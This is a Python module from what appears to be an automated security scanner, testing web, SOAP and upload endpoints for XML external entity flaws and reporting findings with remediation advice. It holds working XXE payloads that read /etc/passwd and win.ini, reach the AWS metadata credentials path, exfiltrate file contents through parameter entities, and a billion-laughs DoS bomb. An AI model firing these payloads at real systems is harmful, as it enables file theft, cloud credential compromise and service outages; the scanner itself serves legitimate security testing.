"""
XIPE — XXE / XML Injection Tester v1.0
Covers XML External Entity attacks relevant for enterprise targets
using SOAP, SAP integrations, document upload, and REST APIs that
accept XML payloads:

1. Classic XXE — read /etc/passwd or internal files
2. Blind XXE — out-of-band via DNS/HTTP callback
3. XXE via file upload (DOCX, SVG, XLSX, PDF)
4. SOAP endpoint XXE
5. XXE to SSRF — use external entity to probe internal services
6. XXE via parameter entities (bypass sanitizers)
7. Billion laughs / XML bomb (DoS)
"""
from __future__ import annotations

import re
import uuid
from typing import Any, Dict, List, Optional

import requests
from requests.exceptions import RequestException, Timeout

from agent.finding import Finding, ScoringDetail, Severity, OWASPCategory
from utils.logger import get_logger

log = get_logger("xxe_tester")

# ── Common XML-accepting endpoint patterns ───────────────────────────────────
XML_PATHS = [
    "/api/xml", "/api/v1/xml", "/api/import", "/api/upload",
    "/api/parse", "/api/v1/import", "/api/document",
    "/ws", "/soap", "/api/soap", "/services",
    "/api/v1/documents", "/api/feed", "/api/rss",
    "/api/v1/upload", "/upload", "/import",
]

SOAP_PATHS = [
    "/ws", "/soap", "/services", "/api/soap",
    "/WebService", "/Service.asmx", "/api/v1/soap",
    "/ws/v1", "/services/v1",
]

UPLOAD_PATHS = [
    "/api/upload", "/upload", "/api/import",
    "/api/v1/upload", "/api/document/upload",
    "/api/v1/import",
]

# ── XXE payloads ─────────────────────────────────────────────────────────────

# Classic — Linux file read
XXE_CLASSIC_LINUX = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

# Classic — Windows file read
XXE_CLASSIC_WIN = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>"""

# XXE to SSRF → AWS metadata
XXE_SSRF_METADATA = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>"""

# XXE to SSRF → localhost
XXE_SSRF_LOCALHOST = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost/">
]>
<root><data>&xxe;</data></root>"""

# Billion laughs (XML bomb) — DoS
XXE_BOMB = """<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<bomb>&d;</bomb>"""

# Parameter entity (bypass basic XXE filters)
XXE_PARAM_ENTITY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://internal-probe/?x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>"""

# SOAP envelope with XXE
SOAP_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetData xmlns="http://tempuri.org/">
      <value>&xxe;</value>
    </GetData>
  </soap:Body>
</soap:Envelope>"""

# SVG with XXE (for image upload endpoints)
SVG_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

# ── File content indicators ───────────────────────────────────────────────────
LINUX_INDICATORS   = ["root:x:", "nobody:x:", "/bin/bash", "/bin/sh", "daemon:"]
WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "MAPI=1", "[Mail]"]
METADATA_INDICATORS = ["ami-id", "instance-id", "iam/security-credentials", "hostname"]
INTERNAL_INDICATORS = ["nginx", "apache", "it works", "welcome", "<html"]


class XXETester:
    def __init__(self, base_url: str, config: Dict[str, Any]):
        self.base_url = base_url.rstrip("/")
        self.config   = config
        self.timeout  = config.get("testing", {}).get("request_timeout", 10)
        self.session  = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "XIPE-SecurityScanner/4.0"})
        token = config.get("scope", {}).get("credentials", {}).get("api_key", "")
        if token:
            self.session.headers["Authorization"] = f"Bearer {token}"
        self._findings: List[Finding] = []

    # ── Entry point ──────────────────────────────────────────────────────────

    def run(self) -> List[Finding]:
        log.info("Starting XXE tests against %s", self.base_url)

        self._test_xml_endpoints()
        self._test_soap_endpoints()
        self._test_upload_endpoints()
        self._test_xml_bomb()

        log.info("XXE tests complete — %d findings", len(self._findings))
        return self._findings

    # ── 1. Generic XML endpoints ─────────────────────────────────────────────

    def _test_xml_endpoints(self):
        for path in XML_PATHS:
            url = self.base_url + path
            # Check endpoint exists
            try:
                probe = self.session.post(url, data="<test/>",
                                          headers={"Content-Type": "application/xml"},
                                          timeout=4)
                if probe.status_code in (404, 502, 503, 405):
                    continue
            except Exception:
                continue

            # Test classic XXE
            for payload, label in [
                (XXE_CLASSIC_LINUX,   "linux"),
                (XXE_CLASSIC_WIN,     "windows"),
                (XXE_SSRF_METADATA,   "ssrf_metadata"),
                (XXE_SSRF_LOCALHOST,  "ssrf_localhost"),
            ]:
                finding = self._send_xxe(url, payload, label, "application/xml")
                if finding:
                    break

    # ── 2. SOAP endpoints ─────────────────────────────────────────────────────

    def _test_soap_endpoints(self):
        for path in SOAP_PATHS:
            url = self.base_url + path
            try:
                probe = self.session.post(
                    url, data=SOAP_XXE,
                    headers={"Content-Type": "text/xml; charset=utf-8",
                             "SOAPAction": "GetData"},
                    timeout=5,
                )
                if probe.status_code in (404, 502, 503):
                    continue
            except Exception:
                continue

            result = self._analyze_xxe_response(probe, "soap_xxe", url)
            if result:
                self._record(
                    title="XXE Injection in SOAP Endpoint",
                    severity=Severity.CRITICAL,
                    endpoint=url,
                    evidence=result["evidence"],
                    xxe_type=result["type"],
                    payload=SOAP_XXE[:200],
                )

    # ── 3. File upload (SVG, DOCX shell) ────────────────────────────────────

    def _test_upload_endpoints(self):
        for path in UPLOAD_PATHS:
            url = self.base_url + path
            # SVG upload
            try:
                files = {"file": ("xipe_test.svg", SVG_XXE.encode(), "image/svg+xml")}
                r = self.session.post(url, files=files, timeout=self.timeout)
                if r.status_code in (404, 502, 503):
                    continue
                result = self._analyze_xxe_response(r, "svg_upload", url)
                if result:
                    self._record(
                        title="XXE via SVG File Upload",
                        severity=Severity.CRITICAL,
                        endpoint=url,
                        evidence=result["evidence"],
                        xxe_type=result["type"],
                        payload="SVG file with <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
                    )
                    continue
            except Exception:
                pass

    # ── 4. XML bomb (DoS) ────────────────────────────────────────────────────

    def _test_xml_bomb(self):
        for path in XML_PATHS[:4]:
            url = self.base_url + path
            try:
                probe = self.session.post(url, data="<test/>",
                                          headers={"Content-Type": "application/xml"},
                                          timeout=3)
                if probe.status_code in (404, 502, 503, 405):
                    continue
            except Exception:
                continue

            try:
                r = self.session.post(
                    url, data=XXE_BOMB,
                    headers={"Content-Type": "application/xml"},
                    timeout=self.timeout,
                )
                # If it took > 5s or returned 500/503, the bomb hit
                if r.elapsed.total_seconds() > 5 or r.status_code in (500, 503):
                    self._record(
                        title="XML Bomb (Billion Laughs) — DoS via Entity Expansion",
                        severity=Severity.HIGH,
                        endpoint=url,
                        evidence=f"XML bomb took {r.elapsed.total_seconds():.1f}s / status {r.status_code}",
                        xxe_type="xml_bomb",
                        payload=XXE_BOMB[:150],
                    )
                    break
            except Timeout:
                self._record(
                    title="XML Bomb (Billion Laughs) — DoS via Entity Expansion",
                    severity=Severity.HIGH,
                    endpoint=url,
                    evidence="XML bomb caused request timeout — server is vulnerable to entity expansion DoS",
                    xxe_type="xml_bomb",
                    payload=XXE_BOMB[:150],
                )
                break
            except Exception:
                continue

    # ── Core send + analyze ──────────────────────────────────────────────────

    def _send_xxe(self, url: str, payload: str, label: str,
                  content_type: str) -> Optional[Dict]:
        try:
            r = self.session.post(
                url, data=payload,
                headers={"Content-Type": content_type},
                timeout=self.timeout,
            )
        except Timeout:
            if "metadata" in label or "localhost" in label:
                self._record(
                    title="Blind XXE to SSRF — Metadata Endpoint Timeout",
                    severity=Severity.HIGH,
                    endpoint=url,
                    evidence="XXE SSRF payload to 169.254.169.254 caused timeout (blind SSRF indicator)",
                    xxe_type=f"blind_{label}",
                    payload=payload[:200],
                )
            return None
        except Exception:
            return None

        result = self._analyze_xxe_response(r, label, url)
        if result:
            type_labels = {
                "linux":         ("XXE — Local File Read (/etc/passwd)", Severity.CRITICAL),
                "windows":       ("XXE — Local File Read (win.ini)", Severity.CRITICAL),
                "ssrf_metadata": ("XXE to SSRF — AWS Cloud Metadata Read", Severity.CRITICAL),
                "ssrf_localhost": ("XXE to SSRF — Internal Service Access", Severity.HIGH),
            }
            title, severity = type_labels.get(label, ("XXE Injection", Severity.CRITICAL))
            self._record(
                title=title,
                severity=severity,
                endpoint=url,
                evidence=result["evidence"],
                xxe_type=result["type"],
                payload=payload[:200],
            )
        return result

    def _analyze_xxe_response(self, resp: requests.Response, label: str, url: str) -> Optional[Dict]:
        body = resp.text[:3000]

        # Check for file content indicators
        for indicator in LINUX_INDICATORS:
            if indicator in body:
                return {"type": "lfi_linux", "evidence": f"Linux file content detected: '{indicator}' in response"}

        for indicator in WINDOWS_INDICATORS:
            if indicator.lower() in body.lower():
                return {"type": "lfi_windows", "evidence": f"Windows file content detected: '{indicator}' in response"}

        for indicator in METADATA_INDICATORS:
            if indicator.lower() in body.lower():
                return {"type": "ssrf_metadata", "evidence": f"AWS metadata content: '{indicator}' in response"}

        if "ssrf_localhost" in label:
            for indicator in INTERNAL_INDICATORS:
                if indicator.lower() in body.lower():
                    return {"type": "ssrf_internal", "evidence": f"Internal service response: '{indicator}'"}

        return None

    # ── Finding builder ──────────────────────────────────────────────────────

    def _record(self, title: str, severity: Severity, endpoint: str,
                evidence: str, xxe_type: str, payload: str):
        if any(f.title == title for f in self._findings):
            return

        sev_map = {Severity.CRITICAL: 9.5, Severity.HIGH: 7.5, Severity.MEDIUM: 5.0}
        base = sev_map.get(severity, 7.5)

        scoring = ScoringDetail(
            severity_score=base,
            exploitability_score=8.5,
            exposure_score=9.0,
            business_risk_score=9.0,
            asset_criticality_score=8.5,
            confidence_score=9.0,
            priority_score=base,
            score_explanation=f"XXE — {xxe_type}",
        )

        descriptions = {
            "lfi_linux": (
                "The XML parser processed an external entity referencing a local filesystem path "
                "and returned the contents of /etc/passwd in the response. An attacker can read "
                "any file accessible by the web server user: private keys, app configs, cloud credentials."
            ),
            "lfi_windows": (
                "The XML parser processed an external entity and returned Windows system file content. "
                "An attacker can enumerate drives, read config files, and potentially pivot to code execution."
            ),
            "ssrf_metadata": (
                "XXE was chained with SSRF to reach the AWS Instance Metadata Service. "
                "The response contained IAM credential information. This enables full AWS account "
                "compromise via the stolen temporary credentials."
            ),
            "ssrf_internal": (
                "XXE was used to perform SSRF against localhost services. Internal APIs, admin panels, "
                "and databases not exposed externally are now reachable through this vector."
            ),
            "soap_xxe": (
                "The SOAP endpoint processed external XML entities. SOAP services are a common "
                "attack surface for XXE — attackers can read internal files or perform SSRF through "
                "any WSDL-based service."
            ),
            "svg_upload": (
                "The file upload endpoint processed an SVG file containing XXE payload. "
                "SVG is XML-based and many image processors expand entities by default. "
                "This enables file read and SSRF through image uploads."
            ),
            "xml_bomb": (
                "The XML parser is vulnerable to billion-laughs entity expansion. "
                "A crafted payload with nested entities caused the server to timeout or error, "
                "enabling denial of service with a small (< 1KB) request."
            ),
        }

        description = descriptions.get(xxe_type, f"XML External Entity injection detected via {xxe_type}.")

        recommendation = (
            "1. Disable external entity processing in your XML parser:\n"
            "   - Java (DocumentBuilderFactory): setFeature('http://xml.org/sax/features/external-general-entities', false)\n"
            "   - Python (lxml): use defusedxml library\n"
            "   - PHP: libxml_disable_entity_loader(true)\n"
            "   - .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit\n"
            "2. Validate and sanitize all XML input before parsing.\n"
            "3. If SOAP/XML is required, use a WAF rule blocking <!ENTITY and <!DOCTYPE.\n"
            "4. For file uploads: validate file type server-side, use a safe image processor.\n"
            "5. Run XML processing in a sandboxed environment without filesystem access."
        )

        f = Finding(
            id=f"XXE-{uuid.uuid4().hex[:8].upper()}",
            title=title,
            severity=severity,
            category=OWASPCategory.INJECTION,
            module="xxe_tester",
            endpoint=endpoint,
            description=description,
            evidence=evidence,
            request_snippet=payload,
            recommendation=recommendation,
            cwe="CWE-611",
            scoring=scoring,
            tags=["xxe", "xml-injection", xxe_type, "owasp-a03"],
        )
        self._findings.append(f)
        log.warning("XXE found: %s at %s", title, endpoint)


# ── Orchestrator entry ────────────────────────────────────────────────────────

def run(base_url: str, config: Dict[str, Any]) -> List[Finding]:
    return XXETester(base_url, config).run()
